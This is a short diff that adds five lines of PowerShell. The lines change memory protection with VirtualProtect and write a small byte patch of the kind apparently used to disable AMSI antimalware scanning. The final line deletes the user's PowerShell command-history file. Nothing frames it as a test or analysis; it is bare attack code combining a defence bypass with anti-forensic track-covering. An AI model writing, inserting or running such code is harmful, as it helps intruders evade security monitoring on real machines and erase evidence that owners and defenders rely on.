@@ -1,0 +1,5 @@
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func kernel32.dll VirtualProtect), (My @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($bananaAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $bananaAddr, 12)
+rm $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
